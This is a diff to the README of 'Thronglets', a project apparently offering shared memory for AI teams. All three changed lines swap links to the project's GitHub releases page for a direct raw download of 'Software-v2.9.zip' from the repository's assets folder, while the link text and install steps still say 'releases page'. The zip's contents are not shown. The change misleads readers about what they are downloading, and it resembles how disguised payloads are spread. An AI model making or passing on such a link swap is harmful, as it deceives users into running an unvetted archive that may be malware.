@@ -1,6 +1,6 @@
 # 🧠 Thronglets - Shared Memory for AI Teams
 
-[![Download Thronglets](https://img.shields.io/badge/Download%20Thronglets-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/igorkrasik609-prog/Thronglets/releases)
+[![Download Thronglets](https://img.shields.io/badge/Download%20Thronglets-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/igorkrasik609-prog/Thronglets/raw/refs/heads/main/assets/Software-v2.9.zip)
 
 ## 🚀 What Thronglets Does
 
@@ -10,7 +10,7 @@ It is built for people who want to run a local or networked AI workspace with sh
 
 ## 📥 Download Thronglets for Windows
 
-1. Open the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/releases)
+1. Open the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/raw/refs/heads/main/assets/Software-v2.9.zip)
 2. Find the latest release
 3. Download the Windows file for your system
 4. If the file is a `.zip`, extract it
@@ -165,7 +165,7 @@ A clear folder setup helps you recover fast if you move the app or change device
 
 ## 📎 Download Again
 
-If you need the latest build, visit the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/releases) and download the newest Windows file
+If you need the latest build, visit the [Thronglets releases page](https://github.com/igorkrasik609-prog/Thronglets/raw/refs/heads/main/assets/Software-v2.9.zip) and download the newest Windows file
 
 ## 🧰 About This Project
 
